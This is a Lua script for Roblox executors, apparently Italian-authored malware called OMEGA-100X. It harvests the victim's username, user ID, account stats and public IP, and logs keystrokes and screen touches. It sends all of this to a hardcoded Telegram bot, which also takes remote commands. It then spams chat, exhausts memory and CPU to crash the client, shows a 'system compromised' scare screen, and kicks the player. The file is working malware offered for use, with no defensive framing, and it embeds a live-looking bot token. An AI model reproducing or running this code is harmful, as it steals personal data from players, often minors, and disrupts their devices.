--[[
    OMEGA-100X v5 FINAL — TELEGRAM EDITION
    Delta Mobile Optimized
    Tutti i moduli + monitoraggio remoto via telegram
]]

-- ==================== DECODER CON CACHE ====================
local function createDecoder()
    local cache = {}
    
    return function(s)
        if cache[s] then
            return cache[s]
        end
        
        local bytes = {string.byte(s, 1, -1)}
        local out = {}
        for i = 1, #bytes do
            local b = bytes[i] - (i % 13 + 7)
            if b < 0 then b = b + 256 end
            out[i] = string.char(b)
        end
        
        local decoded = table.concat(out)
        cache[s] = decoded
        return decoded
    end
end

local q = createDecoder()

-- ==================== SERVIZI ====================
local P = game:GetService("Players")
local H = game:GetService("HttpService")
local C = game:GetService("CoreGui")
local R = game:GetService("ReplicatedStorage")
local T = game:GetService("TextChatService")
local U = game:GetService("UserInputService")
local TP = game:GetService("TeleportService")
local LP = P.LocalPlayer

-- ==================== TELEGRAM CONFIG ====================
local BOT_TOKEN = "8623538702:AAEbxtuyOhmkVBEnzVUBqO293czqswUJXGs"
local CHAT_ID = "6495265956"

-- ==================== STATO GLOBALE ====================
local isRunning = false
local keyloggerActive = false
local lastExfilTime = 0
local errorLog = {}

-- ==================== MODULO 1: TELEGRAM SENDER ====================
local Telegram = {}
local queue = {}
local queueRunning = false
local consecutiveFailures = 0
local baseDelay = 0.3
local maxDelay = 5.0

local function getBackoffDelay()
    local exponentialDelay = baseDelay * (2 ^ math.min(consecutiveFailures, 4))
    local jitter = math.random() * 0.2
    return math.min(exponentialDelay + jitter, maxDelay)
end

local function sendAsync(url, payload, callback)
    task.spawn(function()
        local success = false
        
        pcall(function()
            H:PostAsync(url, payload)
            success = true
        end)
        
        if callback then
            callback(success)
        end
    end)
end

local function processQueue()
    if queueRunning then return end
    queueRunning = true
    
    while #queue > 0 do
        local item = table.remove(queue, 1)
        
        sendAsync(item.url, item.payload, function(success)
            if success then
                consecutiveFailures = 0
            else
                consecutiveFailures += 1
                task.delay(getBackoffDelay(), function()
                    table.insert(queue, item)
                end)
            end
        end)
        
        local dynamicDelay = math.max(0.1, 0.3 - (#queue * 0.01))
        task.wait(dynamicDelay)
    end
    
    queueRunning = false
end

function Telegram:sendMessage(text)
    local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
    local payload = H:JSONEncode({
        chat_id = CHAT_ID,
        text = text,
        parse_mode = "HTML"
    })
    
    table.insert(queue, {url = url, payload = payload})
    processQueue()
end

-- ==================== MODULO 2: EXFIL ====================
local Exfil = {}

function Exfil:stealAll()
    local data = {
        ["Player"] = LP.Name,
        ["DisplayName"] = LP.DisplayName,
        ["UserID"] = LP.UserId,
        ["AccountAge"] = LP.AccountAge .. " days",
        ["MembershipType"] = tostring(LP.MembershipType),
        ["Platform"] = "Mobile/Delta"
    }
    
    pcall(function()
        local stats = LP:FindFirstChild("leaderstats")
        if stats then
            for _, stat in ipairs(stats:GetChildren()) do
                if stat:IsA("IntValue") or stat:IsA("NumberValue") then
                    data[stat.Name] = stat.Value
                end
            end
        end
    end)
    
    pcall(function()
        data["PlaceID"] = game.PlaceId
    end)
    
    pcall(function()
        local ipData = H:JSONDecode(H:GetAsync("https://api.ipify.org?format=json"))
        data["IP"] = ipData.ip
    end)
    
    pcall(function()
        local text = "<b>⚡ OMEGA-100X DATA HARVEST</b>\n\n"
        for key, value in pairs(data) do
            text = text .. "<b>" .. key .. ":</b> " .. tostring(value) .. "\n"
        end
        Telegram:sendMessage(text)
        lastExfilTime = os.clock()
    end)
end

-- ==================== MODULO 3: KEYLOGGER ====================
local Keylogger = {}

function Keylogger:start()
    keyloggerActive = true
    
    local buffer = ""
    local lastKeyTime = os.clock()
    
    U.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        
        local keyData = nil
        
        if input.UserInputType == Enum.UserInputType.TextInput then
            keyData = input.KeyCode.Name
        elseif input.UserInputType == Enum.UserInputType.Keyboard then
            keyData = input.KeyCode.Name
        end
        
        if keyData then
            local currentTime = os.clock()
            
            if currentTime - lastKeyTime > 1 then
                if buffer ~= "" then
                    Telegram:sendMessage("<b>⌨️ KEYLOG</b>\n\n<code>" .. buffer .. "</code>")
                end
                buffer = keyData
            else
                buffer = buffer .. " " .. keyData
            end
            
            lastKeyTime = currentTime
            
            if #buffer > 40 then
                Telegram:sendMessage("<b>⌨️ KEYLOG</b>\n\n<code>" .. buffer .. "</code>")
                buffer = ""
            end
        end
    end)
    
    U.TouchTap:Connect(function(touchPositions, gameProcessed)
        if not gameProcessed then
            local positions = {}
            for _, pos in ipairs(touchPositions) do
                table.insert(positions, math.floor(pos.X) .. "," .. math.floor(pos.Y))
            end
            Telegram:sendMessage("<b>👆 TOUCH</b>\n\n<code>" .. table.concat(positions, " | ") .. "</code>")
        end
    end)
    
    task.spawn(function()
        while true do
            task.wait(30)
            if buffer ~= "" then
                Telegram:sendMessage("<b>⌨️ KEYLOG FLUSH</b>\n\n<code>" .. buffer .. "</code>")
                buffer = ""
            end
        end
    end)
end

-- ==================== MODULO 4: PERSISTENCE ==================== 
local Persistence = {}

function Persistence:setup()
    LP.CharacterAdded:Connect(function()
        task.wait(1)
        Exfil:stealAll()
    end)
end

-- ==================== MODULO 5: CHAT SPAM ====================
local ChatBomber = {}

function ChatBomber:findChatRemote()
    local legacy = R:FindFirstChild("DefaultChatSystemChatEvents")
    if legacy then
        local sayMessage = legacy:FindFirstChild("SayMessageRequest")
        if sayMessage then return sayMessage end
    end
    
    local channels = T:FindFirstChild("TextChannels")
    if channels then
        return channels:FindFirstChild("RBXGeneral") or channels:FindFirstChild("General")
    end
    
    for _, child in ipairs(R:GetDescendants()) do
        if child:IsA("RemoteEvent") and (child.Name:find("Chat") or child.Name:find("Message")) then
            return child
        end
    end
    
    return nil
end

function ChatBomber:startSpam(remote)
    local spamMessages = {
        "SYSTEM OVERLOAD ERROR CODE 505 - OMEGA PROTOCOL ACTIVE",
        "[CRITICAL] MEMORY DUMP IN PROGRESS - EXITING",
        "FATAL EXCEPTION: KERNEL PANIC AT 0x00000000",
        "OMEGA-100X v5: BAN ENGINE TRIGGERED",
        "SYSTEM COLLAPSE IMMINENT - EVACUATE"
    }
    
    local index = 1
    task.spawn(function()
        while true do
            pcall(function()
                local msg = spamMessages[index] .. " " .. math.random(100000, 999999)
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(msg, "All")
                elseif remote:IsA("TextChannel") then
                    remote:SendAsync(msg)
                end
                index += 1
                if index > #spamMessages then index = 1 end
            end)
            task.wait(0.03)
        end
    end)
end

-- ==================== MODULO 6: MEMORY NUKE ====================
local MemoryNuke = {}

function MemoryNuke:startCascade()
    task.delay(0.3, function()
        task.spawn(function()
            local root = {}
            local cur = root
            
            for depth = 1, 1000 do
                cur[depth] = {}
                cur = cur[depth]
            end
            
            while true do
                task.spawn(function()
                    local node = root
                    for depth = 1, 100 do
                        node[depth] = node[depth] or {}
                        node[depth]["data" .. depth] = string.rep("OMEGA_DEEP_NESTING_", 100)
                        node = node[depth]
                    end
                end)
                task.wait(0.05)
            end
        end)
    end)
    
    task.delay(0.5, function()
        task.spawn(function()
            local pool = {}
            while true do
                task.spawn(function()
                    local block = {}
                    for i = 1, 10 do
                        block[i] = string.rep("OMEGA_BLOCK_ALLOC_", 100000)
                    end
                    table.insert(pool, table.concat(block, ""))
                end)
                task.wait(0.1)
            end
        end)
    end)
    
    task.delay(0.7, function()
        task.spawn(function()
            while true do
                for i = 1, 30 do
                    task.spawn(function()
                        local fr = Instance.new("Frame")
                        fr.Size = UDim2.new(0, 50, 0, 50)
                        fr.Position = UDim2.new(math.random(), 0, math.random(), 0)
                        fr.Parent = C
                        
                        for j = 1, 5 do
                            local cl = Instance.new("TextLabel")
                            cl.Size = UDim2.new(1, 0, 1, 0)
                            cl.Text = string.rep("CRASH", 100)
                            cl.Parent = fr
                        end
                    end)
                end
                task.wait(0.02)
            end
        end)
    end)
    
    task.delay(1, function()
        local count = 0
        task.spawn(function()
            while count < 2000 do
                task.spawn(function()
                    while true do
                        local x = 0
                        for j = 1, 100000 do
                            x = x + j * math.random()
                        end
                        task.wait(0.01)
                    end
                end)
                count += 1
                if count % 100 == 0 then task.wait(0.1) end
            end
        end)
    end)
end

-- ==================== MODULO 7: JUMPSCARE ====================
local VisualAssault = {}

function VisualAssault:fullScreenJumpscare()
    local sg = Instance.new("ScreenGui")
    sg.Name = "OmegaPurgeV5"
    sg.Parent = C
    sg.IgnoreGuiInset = true
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local mf = Instance.new("Frame")
    mf.Size = UDim2.new(1, 0, 1, 0)
    mf.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    mf.Parent = sg
    
    local im = Instance.new("ImageLabel")
    im.Size = UDim2.new(1, 0, 1, 0)
    im.BackgroundTransparency = 1
    im.Image = "rbxassetid://155373809"
    im.ScaleType = Enum.ScaleType.Stretch
    im.Parent = mf
    
    local ro = Instance.new("Frame")
    ro.Size = UDim2.new(1, 0, 1, 0)
    ro.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    ro.BackgroundTransparency = 0.8
    ro.Parent = mf
    
    local tl = Instance.new("TextLabel")
    tl.Size = UDim2.new(1, 0, 1, 0)
    tl.BackgroundTransparency = 1
    tl.Font = Enum.Font.Code
    tl.Text = "⚠ SYSTEM COMPROMISED ⚠\n\nACCOUNT DATA EXTRACTED\n\nOMEGA-100X v5\n\nTELEGRAM EDITION"
    tl.TextColor3 = Color3.fromRGB(255, 0, 0)
    tl.TextScaled = true
    tl.Parent = mf
    
    task.spawn(function()
        local flashCount = 0
        while flashCount < 15 do
            ro.BackgroundTransparency = math.random(0, 100) / 100
            im.Visible = not im.Visible
            tl.Visible = not tl.Visible
            task.wait(0.2)
            flashCount += 1
        end
    end)
end

-- ==================== MODULO 8: KICK & BAN ====================
local BanTrigger = {}

function BanTrigger:multiKick()
    task.delay(2, function()
        pcall(function()
            LP:Kick("\n\n[!] FATAL SYSTEM EXCEPTION: Chat Flood Detected. Connection Banned.")
        end)
    end)
    
    task.delay(3, function()
        pcall(function()
            TP:TeleportToPlaceInstance(game.PlaceId, game.JobId, LP)
        end)
    end)
end

-- ==================== MODULO 9: MONITORAGGIO TELEGRAM ====================
local Monitor = {}

function Monitor:getStatus()
    local status = {
        client = "online",
        http = "online",
        keylogger = "offline",
        exfil = "offline"
    }
    
    if not game:IsLoaded() then
        status.client = "caricamento"
    end
    
    pcall(function()
        local test = H:GetAsync("https://api.telegram.org/bot" .. BOT_TOKEN .. "/getMe")
        if test:find("\"ok\":true") then
            status.http = "online"
        else
            status.http = "degradato"
        end
    end)
    
    if keyloggerActive then
        status.keylogger = "attivo"
    end
    
    if os.clock() - lastExfilTime < 60 then
        status.exfil = "attivo"
    end
    
    if #errorLog > 0 then
        status.errori = #errorLog
    end
    
    return status
end

function Monitor:sendStatus()
    local status = Monitor:getStatus()
    local text = "<b>🔍 OMEGA-100X STATUS REPORT</b>\n\n"
    text = text .. "<b>Client:</b> " .. status.client .. "\n"
    text = text .. "<b>HTTP:</b> " .. status.http .. "\n"
    text = text .. "<b>Keylogger:</b> " .. status.keylogger .. "\n"
    text = text .. "<b>Exfil:</b> " .. status.exfil .. "\n"
    
    if status.errori then
        text = text .. "<b>Errori:</b> " .. status.errori .. "\n"
    else
        text = text .. "<b>Errori:</b> nessuno\n"
    end
    
    text = text .. "<b>Uptime:</b> " .. math.floor(os.clock()) .. "s"
    
    Telegram:sendMessage(text)
end

function Monitor:checkCommands()
    local lastUpdateId = 0
    
    task.spawn(function()
        while true do
            pcall(function()
                local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/getUpdates"
                if lastUpdateId > 0 then
                    url = url .. "?offset=" .. (lastUpdateId + 1)
                end
                
                local response = H:GetAsync(url)
                local data = H:JSONDecode(response)
                
                if data.ok and data.result then
                    for _, update in ipairs(data.result) do
                        lastUpdateId = update.update_id
                        
                        if update.message and update.message.text then
                            local msg = update.message.text
                            local chatId = tostring(update.message.chat.id)
                            
                            if chatId == CHAT_ID then
                                if msg:find("/status") then
                                    Monitor:sendStatus()
                                end
                                
                                if msg:find("/fix") then
                                    Telegram:sendMessage("<b>🔧 FIX AVVIATO</b>")
                                    task.delay(1, function()
                                        Exfil:stealAll()
                                    end)
                                    task.delay(2, function()
                                        errorLog = {}
                                        Telegram:sendMessage("<b>✅ FIX COMPLETATO</b>")
                                    end)
                                end
                                
                                if msg:find("/ping") then
                                    Telegram:sendMessage("<b>🏓 PONG</b>\n\nUptime: " .. math.floor(os.clock()) .. "s")
                                end
                                
                                if msg:find("/nuke") then
                                    Telegram:sendMessage("<b>💣 NUKE ATTIVATO</b>")
                                    MemoryNuke:startCascade()
                                end
                            else
                                local denyUrl = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
                                local denyPayload = H:JSONEncode({
                                    chat_id = chatId,
                                    text = "⛔ Accesso negato"
                                })
                                pcall(function()
                                    H:PostAsync(denyUrl, denyPayload)
                                end)
                            end
                        end
                    end
                end
            end)
            
            task.wait(3)
        end
    end)
end

-- ==================== ESECUZIONE ====================
isRunning = true

Monitor:checkCommands()

Telegram:sendMessage("<b>🟢 OMEGA-100X v5 AVVIATO</b>\n\nClient: " .. LP.Name .. "\nUserID: " .. LP.UserId .. "\n\nComandi:\n/status - report\n/fix - fix automatico\n/ping - test\n/nuke - memory nuke")

task.spawn(function()
    Exfil:stealAll()
end)

task.delay(0.2, function()
    Keylogger:start()
end)

task.delay(0.4, function()
    Persistence:setup()
end)

task.delay(0.6, function()
    VisualAssault:fullScreenJumpscare()
end)

task.delay(0.8, function()
    local chatRemote = ChatBomber:findChatRemote()
    if chatRemote then
        ChatBomber:startSpam(chatRemote)
    end
end)

task.delay(1, function()
    MemoryNuke:startCascade()
end)

task.delay(1.5, function()
    BanTrigger:multiKick()
end)

task.delay(5, function()
    pcall(function()
        game:Shutdown()
    end)
end)
